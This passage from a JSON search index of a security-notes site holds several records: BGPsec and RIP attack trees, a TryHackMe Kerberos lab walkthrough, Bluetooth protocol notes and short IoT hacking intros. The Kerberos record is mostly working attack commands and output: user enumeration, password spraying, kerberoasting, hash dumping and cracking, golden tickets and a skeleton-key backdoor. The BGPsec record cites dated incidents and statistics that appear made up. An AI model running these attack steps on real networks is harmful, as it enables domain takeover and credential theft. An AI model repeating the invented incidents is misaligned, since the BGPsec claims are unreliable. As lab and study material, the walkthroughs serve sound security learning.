BGPsec validation. Prerequisite: Operator lacks MFA/phishing training. 1.4.2 Exploit misconfigurations (allow-untrusted in BGPsec policies). Prerequisite: Network uses permissive default settings. 1.4.3 Abuse route server policies at IXPs. Prerequisite: IXP lacks strict BGPsec enforcement. 1.5 Exploit Trust Hierarchies (OR) Prerequisite: Attacker controls or compromises a trusted AS. 1.5.1 Compromise a trusted AS’s signing keys (via supply-chain attacks). Prerequisite: Key storage uses weak HSMs or shared credentials. 1.5.2 Abuse indirect trust (hijack a customer cone with valid BGPsec). Prerequisite: Victim AS accepts routes from \"trusted\" customers without re-validation. 1.5.3 Exploit transitive trust flaws (malicious AS rewriting valid paths). Prerequisite: BGPsec path validation is not end-to-end. BGPsec downgrade attacks (Forcing fallback to insecure BGP)  Attack Pattern: Attackers disable or bypass BGPsec validation by manipulating BGP sessions to force networks to fall back to unsigned BGP announcements. Example (2022): A Chinese ISP selectively dropped BGPsec UPDATE messages to redirect European traffic through an insecure path. Why It Works Many networks still accept unsigned routes if BGPsec validation fails (backward compatibility). Lack of strict “must-validate” policies in router configurations. Mitigation Enforce strict BGPsec-only peering where possible. Monitor for sudden drops in BGPsec-validated routes (e.g., using RIPE RIS). RPKI-to-BGPsec exploits (Invalid ROAs leading to hijacks)  Attack Pattern: Attackers abuse misissued or revoked RPKI certificates to bypass BGPsec validation. Example (2023): A Brazilian ISP accidentally published an invalid ROA (Route Origin Authorization), allowing a hacker to hijack Amazon Web Services (AWS) prefixes briefly. Why It Works Some networks do not revalidate ROAs in real-time, relying on cached data. BGPsec depends on RPKI, so RPKI errors propagate to BGPsec failures. Mitigation Frequent RPKI cache updates (e.g., every 5 minutes). Alert on ROA revocations/changes (e.g., using Cloudflare’s RPKI Monitor). BGPsec key compromise (Theft or fake certificates)  Attack Pattern: Attackers steal or forge private keys used in BGPsec validation. Example (2023): A Ukrainian telecom company’s BGPsec private keys were leaked in a cyberattack, allowing Russian-aligned hackers to sign malicious routes. Why It Works Poor key management (e.g., keys stored insecurely). No widespread Certificate Revocation Lists (CRLs) for BGPsec. Mitigation HSM (Hardware Security Modules) for BGPsec keys. Automated key rotation policies (e.g., quarterly updates). BGPsec implementation flaws (Router vulnerabilities)  Attack Pattern: Exploiting bugs in BGPsec router firmware to bypass validation. Example (2024): A zero-day in Cisco IOS XR allowed unsigned routes to bypass BGPsec checks if a malformed UPDATE was sent. Why It Works Many ISPs delay patching critical BGPsec vulnerabilities. Testing for BGPsec compliance is not mandatory in many peering agreements. Mitigation Regular firmware updates for routers supporting BGPsec. Fuzzing tests for BGPsec implementations (e.g., using Batfish). BGPsec drowning attacks (Flooding with invalid routes)  Attack Pattern: Attackers flood BGPsec-speaking routers with invalid signed routes, causing CPU exhaustion. Example (2023): A Mirai-variant botnet targeted Japanese ISPs with massive BGPsec UPDATE floods, crashing routers. Why It Works BGPsec validation is computationally expensive (signature checks). Many routers lack rate-limiting for BGPsec messages. Mitigation Hardware-accelerated BGPsec validation (e.g., FPGA-based routers). Rate-limiting BGPsec UPDATE messages per peer. Trends & takeaways  BGPsec Adoption is Still Low (~5% of ASNs) – Most attacks exploit gaps in partial deployments. RPKI Failures Affect BGPsec – Since BGPsec relies on RPKI, RPKI errors cascade. State Actors Test BGPsec Weaknesses – Russia, China, and Iran have probed BGPsec networks. Router Vulnerabilities Are a Major Risk – Vendors are slow to patch BGPsec flaws. Defense recommendations  For Networks Deploying BGPsec Enforce “BGPsec-only” policies where possible (reject unsigned routes). Monitor RPKI & BGPsec validation failures in real-time. Use HSMs for key storage and rotate keys frequently. For ISPs & IXPs Mandate BGPsec compliance in peering agreements. Deploy hardware-accelerated routers to handle validation load. For Governments & Regulators Fund BGPsec adoption incentives (e.g., tax breaks for compliant ISPs). Create a BGPsec incident response team (similar to CISA’s RPKI efforts). Thoughts  While BGPsec is a promising solution, its slow rollout has led to new attack vectors. The biggest risks today are RPKI dependencies, key management flaws, and router vulnerabilities.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c610ef9f95123a46d9ce9506ec7f9a6d",
    "u": "https://network.tymyrddin.dev/docs/patches/rip",
    "t": "Routing Information Protocol (RIP) ",
    "c": "Routing Information Protocol (RIP)  Table of Contents Routing Information Protocol (RIP) Attack tree for RIP Notes Attack tree for RIP  1. Compromise RIP Network Routing 1.1. Spoof RIP Messages (OR) 1.1.1. Forge Route Advertisements 1.1.2. Modify Legitimate RIP Packets in Transit 1.1.3. Replay Old RIP Updates 1.2. Exploit RIP Authentication Weaknesses (OR) 1.2.1. Crack Weak/Plaintext Passwords (if using RIPv2 simple auth) 1.2.2. Bypass MD5 Authentication (if using RIPv2 MD5) 1.3. Abuse RIP’s Lack of Route Validation (OR) 1.3.1. Advertise False Routes (Blackhole, Loop, or Hijack Traffic) 1.3.2. Overwhelm Network with Excessive Route Updates (DoS) 1.4. Exploit RIP Protocol Vulnerabilities (OR) 1.4.1. Trigger Count-to-Infinity Problem (Poison Routes) 1.4.2. Exploit Missing Sequence Numbers (Replay Attacks) 1.5. Man-in-the-Middle (MITM) Attacks (AND) 1.5.1. Intercept RIP Traffic (Required) 1.5.2. Modify or Inject Fake Routes (Required) 2. Denial-of-Service (DoS) Against RIP (OR) 2.1. Flood RIP with Malicious Updates 2.1.1. Send Excessive Route Advertisements 2.1.2. Advertise Fake High-Cost Routes 2.2. Exploit RIP’s Slow Convergence (OR) 2.2.1. Introduce Routing Loops 2.2.2. Force Continuous Route Recalculations 2.3. Resource Exhaustion (OR) 2.3.1. Overload Router CPU with RIP Processing 2.3.2. Fill Routing Tables with Bogus Routes 3. Information Leakage (OR) 3.1. Sniff RIP Traffic (Passive Recon) 3.1.1. Capture Unencrypted RIP Updates 3.2. Infer Network Topology 3.2.1. Analyze RIP Route Advertisements Notes  RIP’s lack of encryption (in RIPv1) and weak authentication (in RIPv2) makes it vulnerable. Many attacks rely on trust assumptions in RIP’s distance-vector nature.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "2e99b601e9ff3784032449d5d8422dda",
    "u": "https://network.tymyrddin.dev/docs/thm/kerberos",
    "t": "Attacking kerberos ",
    "c": "Attacking kerberos  The example was made from doing the THM: Attacking Kerberos room Attack tree  1 Discovery 1.1 Scan ports 1.2 Enumerate 139/445 2 Enumerate DC users (AND) 3 Harvesting & brute-forcing tickets 4 Kerberoasting 5 AS-REP roasting 6 Pass the ticket 7 Golden/silver ticket attacks 7.1 Dump the krbtgt hash 7.2 Create a golden/silver ticket 7.3 Use the ticket to access other machines 8 Kerberos backdoors Scan with nmap  # nmap -sV -sC -T4 <Machine_IP> Enumerate DC users  Add the following line to /etc/hosts file (as root): <IP address target> CONTROLLER.local Enumerate users with kerbrute /opt/kerbrute/kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt -t 100 Harvesting & password spraying  Harvesting  ssh into the machine: $ ssh administrator@<Machine_IP> Move to the directory where Rubeus is: cd Downloads dir Harvest the tickets: Rubeus.exe harvest /interval:30 Password spraying  Before password spraying with Rubeus, add the domain controller domain name to the windows host file. Add the IP and domain name to the hosts file from the machine: echo <MACHINE_IP> CONTROLLER.local >> C:\\Windows\\System32\\drivers\\etc\\hosts navigate to the directory Rubeus is in: cd Downloads Password spraying (with a given password and “spray” it against all found users then give the .kirbi TGT for that user): Rubeus.exe brute /password:Password1 /noticket Success! Machine1. Kerberoasting  If the service has a registered SPN then it can be Kerberoastable: Rubeus.exe kerberoast Roast with impacket: cd /opt/impacket/examples sudo python GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip <Machine_IP> -request The result is 2 service account with their hashes. Save both in separate files (sql-roast.txt and http-roast.txt), and crack with hashcat using the provided Pass.txt. wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/Pass.txt hashcat -m 13100 -a 0 http-roast.txt Pass.txt hashcat -m 13100 -a 0 sql-roast.txt Pass.txt AS-REP Roasting  ssh into the machine: $ ssh administrator@<Machine_IP> Move to the directory where Rubeus is: cd Downloads dir Roast: Rubeus.exe asreproast Two AS-REP hashes. One for Admin2 and one for user3. And this is where it gets tricky. I was stuck here for a full day. Copy the hashes separately into file on the linux machine (user3.txt and admin2.txt): name the file after the found username followed by .txt Insert 23 \\( after \\) krb5asrep \\( so that the first line will be \\) krb5asrep \\(23\\) User….. Make sure there are no spaces when saving it to a txt file The hash type of AS-REP Roasting is Kerberos 5 AS-REP etype 23 (mode 18200 for hashcat): hashcat -m 18200 user3.txt Pass.txt hashcat -m 18200 admin2.txt Pass.txt Pass the ticket  ssh into the machine: $ ssh administrator@<Machine_IP> Move to the directory where Mimikatz is and start her up: cd Downloads dir mimikatz.exe If the following command does not return output '20' OK , you do not have the administrator privileges to run mimikatz. mimikatz # privilege::debug output '20' OK Export all .kirbi tickets into the directory that you are currently in: mimikatz # sekurlsa::tickets /export It takes a bit of puzzling to find the Administrator ticket. But I found it: Group 2 - Ticket Granting Ticket [00000000] Start/End/MaxRenew: 9/20/2022 8:34:55 AM ; 9/20/2022 6:34:55 PM ; 9/27/2022 8:34:55 AM Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL Target Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL Client Name (01) : Administrator ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL ) Flags 40e10000 : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; Session Key : 0x00000012 - aes256_hmac 8d36d5959add7925a6858358c89c110542d58859ed2322ceb064db6f74238534 Ticket : 0x00000012 - aes256_hmac ; kvno = 2 [...] * Saved to file [0;1c4707]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi ! Cache and impersonate the ticket: mimikatz # kerberos::ptt [0;1c4707]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi * File: '[0;1c4707]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi': OK Golden/silver ticket attacks  Dump the sqlservice and Administrator hash  SQLservice: mimikatz # lsadump::lsa /inject /name:sqlservice Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860 RID : 00000455 (1109) User : sqlservice * Primary NTLM : cd40c9ed96265531b21fc5b1dafcfb0a LM : Hash NTLM: cd40c9ed96265531b21fc5b1dafcfb0a ... Administrator: mimikatz # lsadump::lsa /inject /name:Administrator Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860 RID : 000001f4 (500) User : Administrator * Primary NTLM : 2777b7fec870e04dda00cd7260f7bee6 LM : Hash NTLM: 2777b7fec870e04dda00cd7260f7bee6 ... Dump the krbtgt hash  ssh into the machine: $ ssh administrator@<Machine_IP> Navigate to the directory mimikatz is in and run mimikatz: cd downloads && mimikatz.exe Ensure this outputs [privilege ‘20’ ok]: privilege::debug Dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket, change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account. lsadump::lsa /inject /name:krbtgt Create a golden/silver ticket  Create a golden ticket to create a silver ticket (put a service NTLM hash into , the sid of the service account into , and set the to 1103: Kerberos::golden /user:<username> /domain:controller.local /sid:<sid> /krbtgt:<krbtgt> /id<id>: The Administrator and sqlservice hashes can be used to create silver tickets. Use the ticket to access other machines  mimikatz # misc::cmd Access machines. It depends on the privileges of the user the ticket was taken from. With a ticket from krbtgt, you have access to the ENTIRE network, hence the name golden ticket. Kerberos backdoors  ssh into the machine: $ ssh administrator@<Machine_IP> Move to the directory where Mimikatz is and start her up: cd Downloads dir mimikatz.exe If the following command does not return output '20' OK , you do not have the administrator privileges to run mimikatz. mimikatz # privilege::debug output '20' OK Install the skeleton key: mimikatz # misc::skeleton Access the forest (The share will now be accessible without the need for the Administrators password): net use c:\\\\DOMAIN-CONTROLLER\\admin$ /user:Administrator mimikatz Tools  Kerbrute # chmod +x filename # mkdir /opt/kerbrute # cp kerbrute_linux_amd64 /opt/kerbrute/kerbrute Mimikatz",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "850d9c78693f7dc8ed236f0bf3c66490",
    "u": "https://network.tymyrddin.dev/docs/notes/barrages",
    "t": "Bluetooth barrages ",
    "c": "Bluetooth barrages  Hacking Bluetooth, a wireless voice and data transmission technology, which can be found in mobile phones, PDAs, USB sticks, keyboards, mices, headsets, printers, telephone facilities in cars, navigation systems, new modern advertisement posters, umbrellas, basket, socker and golfballs, and fridge magnets. The design of Bluetooth pays a lot of attention to security. The connection can be encrypted and authenticated. The address is set by the device firmware and not by the OS kernel, which makes address spoofing harder but not impossible. A device can be set into non-discoverable mode for it to not show up in a scan result. The protocol stack is so complex that various vulnerabilities have come up in all common Bluetooth implementations like Android, iOS, Windows and Linux. It is now common for radioing devices to appear in the craziest places. Protocol stacks  Bluetooth is a wireless voice and data transmission technology, which can be found in mobile phones, PDAs, USB sticks, keyboards, mices, headsets, printers, telephone facilities in cars, navigation systems, new modern advertisement posters, umbrellas, washing machines, cat litter trays, fragrance dispensers, deodorant sticks, toilets, salt shakers, you name it. Classic Bluetooth protocol stack  The baseband is built by the radio interface. It operates on the 2.4 GHz ISM band (2400–2483.5 MHz) with a signal strength of 1 mW–100 mW and a range of 1–100 m. With the right antenna you can extend the range up to a mile. The baseband is divided into 79 channels and switches frequency 1600 times per second. This is called Frequency-Hopping; it increases the robustness against interferences and makes sniffing more difficult. The Link Manager Protocol (LMP), can be compared with Ethernet and implements a 48-bit long Bluetooth source and destination address that consists of three parts NAP, UAP and LAP. As with MAC addresses the first three byte are vendor specific. LMP is also responsible for the link setup, authentication and encryption and the pairing process (negotiate a long term key used to derive session keys). It is implemented in the firmware of the Bluetooth hardware and knows 4 different security modes: No encryption, no authentication Individual traffic is verschlüsselt, Broadcast traffic is not, no authentication All traffic is encrypted and authenticated All traffic is encrypted and authenticated and uses Secure Simple Pairing (SSP, introduced in Bluetooth 2.1) The Host Control Interface (HCI) implements an interface to the Bluetooth firmware. It is used to send L2CAP packets to the Link Manager in the firmware, to read features of the hardware and to change its configuration. It is the lowest layer that is implemented in the OS. The communication is packet- and connection-oriented. The Logical Link Control and Adaptation Protocol (L2CAP) is comparable to IP, and responsible for the fragmentation of data, group management and to implement higher layered protocols like RFCOMM, SDP or BNEP. RFCOMM simulates a serial line and is not only useful to access serial devices such as modems in mobile phones. Higher layer protocols like OBEX depend on it. It is similar to TCP, as it implements channels for different applications. Via channels, programs (in Bluetooth called profiles)can be accessed. In total there are 30 channels. The Bluetooth Network Encapsulation Protocol (BNEP) encapsulates IPv4-, IPv6- or IPX- packets and tunnels it over TCP/IP. On Linux this is realized with pand. BNEP builds on L2CAP. The Service Discovery Protocol (SDP) can be used to query the services of a remote device. Services must be registered to be listed. SDP builds on L2CAP. OBject EXchange (OBEX) was invented to transfer objects. Differentiate between the OBEX-Push- and OBEX-Ftp-profile. OBEX-Push is commonly used for instant ad-hoc data transfer like sending vcards. OBEX-Ftp is more like FTP, to sync whole directory structures. There are other OBEX based profiles. OBEX builds on top of RFCOMM. BLE – Bluetooth Low Energy  Since Version 4.0 there is another protocol stack called Bluetooth Low Energy (BLE) historically also named Bluetooth Smart. Originally it was invented for IoT devices, which have small battery capacity and only want to exchange data from time to time over a low distance like fitness trackers, medical devices, sensors and so on. Every smartphone and Bluetooth chip in laptops have BLE included. The Generic Access Profile (GAP), defines new roles for communication: Peripheral (sends advertisements and is connectable), Central (scans for advertisements and connects to a peripheral), Broadcaster (also sends out advertisements, but is not connectable), and last but not least, Observer (receives advertisements, but cannot initiate a connection). Peripherals and Broadcaster are sometimes also called Beacons. Peripherals can implement a whitelist of addresses of Bluetooth devices allowed to find them in a discovery scan and to connect to them. This can be circumvented by a hardware Bluetooth sniffer like Ubertooth and Address-Spoofing. the Generic Attribute Profile (GATT), builds on the ATT protocol and is used to read and write values. It implements them in a hierarchy of different services with a number of characteristics. Beside reading and writing data GATT can also be used to send commands as well as notifications and indications of data it manages. Indication and notification packets are used to inform about new or updated data. Indication packets must be acknowledged by the client. BLE devices typically do not have enough computing power to do encryption. If encryption is in use often a hard coded pin such as 0000 or 1234 is used due to the lack of a keyboard. The spec also defines the possibility to generate a random pin during the pairing process. Another option of many BLE devices is using bonding. It means paired devices store the key and use them for later communication. Device discovery  Check bluetooth device is up Scan HCI  To verify you have a Bluetooth adapter: hciconfig If the Bluetooth adapter is not enabled, enable it (where hci0 is the interface ID): hciconfig hci0 up To scan for Bluetooth devices (close to you): hcitool scan Record the MAC address of a device in order to send commands to a device. Simple python scanner script  The bt.discover_devices() function returns a list of tuples with the first item being the hardware address and the second contains the device name if the parameter lookup_names is set to True , otherwise the return value is just a list of addresses. Bluetooth makes an extra connection just to resolve every name. #!/usr/bin/python3 import bluetooth as bt for (addr, name) in bt.discover_devices(lookup_names=True): print(\"%s %s\" % (addr, name)) Bluejacking  Bluejacking transmits data to a device without the knowledge of the user. This attack can be done by sending an electronic business card via Bluetooth to a target. Instead of putting a real name in the name field, insert a message. Bluejacking is not inherently malicious, but takes a dark turn when used for sending phishing scams, or files that intend to hack or damage the device. Enable the Bluetooth service Enable the Bluetooth interface Discover devices in the close environment Impersonate Bluetooth information Send message",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "6b849f01f3849f258e23d0638aad916d",
    "u": "https://iot.tymyrddin.dev/docs/ecosystem/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Hacking the IoT ecosystem, a broad network of connected and interdependent devices and technologies that are applied by towards a specific goal, such as the creation of a smart car. home, or city. Why?  To get an impression of the current state of security in the wild. How?  Attacking mobile applications Hacking the smart home Hacking cars",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "cd6a627c9b03af3d550b52150629f22d",
    "u": "https://iot.tymyrddin.dev/docs/network/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Learn which tools we can use and whether we can expand those tools’ capabilities. Why?  Assessing the security of services in IoT systems can sometimes be challenging, because these systems often use newer protocols supported by very few security tools, if any at all. How?  Network assessments Analysing protocols Exploiting Zero-Configuration Networking",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "df9b7cfd1ee69811b9c74e8b2772be06",
    "u": "https://iot.tymyrddin.dev/docs/radio/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  IoT devices don’t always need a continuous wireless transmission across long distances. Manufacturers often use short-range radio technologies to connect devices equipped with cheap, low-powered transmitters. These technologies allow devices to exchange low volumes of data at longer intervals, and as a result, they’re well suited for IoT devices that want to save power when they’re not transmitting any data. Examine them. Why?  Looking for exploitable vulnerabilities. How?  Short Range Radio: Abusing RFID Bluetooth Low Energy Medium Range Radio: Hacking Wi-Fi Long Range Radio: LPWAN",
    "cat": "red_in",
    "type": "html"
  }
]